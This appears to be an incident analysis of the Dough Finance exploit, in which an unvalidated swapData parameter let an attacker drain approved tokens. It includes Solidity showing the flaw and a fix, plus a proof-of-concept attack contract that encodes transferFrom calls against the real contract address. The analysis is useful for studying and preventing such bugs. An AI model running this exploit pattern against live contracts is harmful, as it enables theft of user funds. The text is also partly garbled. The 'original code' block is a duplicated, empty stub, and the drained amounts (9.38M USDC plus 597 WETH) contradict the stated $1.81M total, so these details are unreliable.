# Dough Finance — Token Theft via Arbitrary Calldata Execution Analysis

| Field | Details |
|------|------|
| **Date** | 2024-07-11 |
| **Protocol** | Dough Finance |
| **Chain** | Ethereum |
| **Loss** | ~1,810,000 USD |
| **Attacker** | Address unidentified |
| **Attack Tx** | [0x92cdcc732eebf47200ea56123716e337f6ef7d5ad714a2295794fdc6031ebb2e](https://etherscan.io/tx/0x92cdcc732eebf47200ea56123716e337f6ef7d5ad714a2295794fdc6031ebb2e) |
| **Vulnerable Contract** | [0x534a3bb1eCB886cE9E7632e33D97BF22f838d085](https://etherscan.io/address/0x534a3bb1eCB886cE9E7632e33D97BF22f838d085) |
| **Root Cause** | The `swapData` parameter of `flashloanReq()` allows arbitrary function calls without validation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-07/DoughFina_exp.sol) |

---

## 1. Vulnerability Overview

Dough Finance's Paraswap connector contract (`0x534a3bb1...`) exposed a `flashloanReq()` function that accepted a `swapData` array and executed arbitrary external calls. The attacker encoded a `transferFrom(0x23b872dd)` selector into `swapData` to directly drain approximately 9,380,000 USDC and 597 WETH from victims. Total losses reached approximately $1.81 million USD.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: swapData array executed without validation
function flashloanReq(
    address[] calldata assets,
    uint256[] calldata amounts,
    bytes[] calldata swapData  // ❌ Arbitrary calldata — no validation
) external {
    // After receiving Aave flash loan, executes swapData as-is
    for (uint i = 0; i < swapData.length; i++) {
        (address target, bytes memory data) = abi.decode(swapData[i], (address, bytes));
        target.call(data);  // ❌ Executes arbitrary calldata on arbitrary address
    }
}

// ✅ Correct code: only executes whitelisted function selectors
function flashloanReq(
    address[] calldata assets,
    uint256[] calldata amounts,
    bytes[] calldata swapData
) external {
    for (uint i = 0; i < swapData.length; i++) {
        (address target, bytes memory data) = abi.decode(swapData[i], (address, bytes));
        bytes4 selector = bytes4(data);
        require(allowedSelectors[target][selector], "Selector not allowed");  // ✅ Whitelist
        target.call(data);
    }
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: DoughFinance_decompiled.sol
contract DoughFinance {
contract DoughFinance {
    address public owner;

}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► Calls flashloanReq() on vulnerable contract (0x534a3bb1)
  │         └─► swapData[0]: encodes transferFrom(victim, attacker, 9,380,000 USDC)
  │         └─► swapData[1]: encodes transferFrom(victim, attacker, 597 WETH)
  │
  ├─[2]─► Contract executes transferFrom on USDC contract
  │         └─► Moves 9,380,000 USDC from victim → attacker
  │
  ├─[3]─► Contract executes transferFrom on WETH contract
  │         └─► Moves 597 WETH from victim → attacker
  │
  └─[4]─► Total loss: ~1,810,000 USD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackContract {
    address constant VULN = 0x534a3bb1eCB886cE9E7632e33D97BF22f838d085;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function testExploit() external {
        // [1] Encode transferFrom calls into swapData
        // 0x75b4b22d = custom function selector
        // 0x23b872dd = transferFrom(address,address,uint256)
        bytes memory swapData0 = abi.encode(
            USDC,
            abi.encodeWithSelector(bytes4(0x23b872dd), victim, address(this), 9_380_000e6)
        );
        bytes memory swapData1 = abi.encode(
            WETH,
            abi.encodeWithSelector(bytes4(0x23b872dd), victim, address(this), 597e18)
        );

        bytes[] memory swapDatas = new bytes[](2);
        swapDatas[0] = swapData0;
        swapDatas[1] = swapData1;

        // [2] Call flashloanReq — executes arbitrary calls embedded in swapData
        IDoughConnector(VULN).flashloanReq(
            new address[](0), new uint256[](0), swapDatas
        );
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Arbitrary External Call |
| **Attack Technique** | Unvalidated Calldata Execution via flashloanReq |
| **DASP Category** | Access Control |
| **CWE** | CWE-20: Improper Input Validation |
| **Severity** | Critical |
| **Attack Complexity** | Low |

## 6. Remediation Recommendations

1. **Function Selector Whitelist**: Restrict `swapData` execution to only approved `(target, selector)` pairs.
2. **Block Token Transfer Calls**: Explicitly block `transferFrom` selector invocations within swap adapters.
3. **Input Validation Hardening**: Validate the target address and function selector for each entry in the `swapData` array.
4. **Principle of Least Privilege**: Minimize token approvals held by the contract.

## 7. Lessons Learned

- **Dangers of Arbitrary Calldata**: When DeFi adapters execute user-supplied calldata without validation, every approval granted to the protocol becomes a potential theft vector.
- **Flash Loan Adapter Vulnerabilities**: Flash loan-integrated adapters must restrict execution to swap logic only, and block token transfer functions entirely.
- **Exploitation of Pre-existing Victim Approvals**: Users who granted excessive approvals to the contract became the targets of the attack.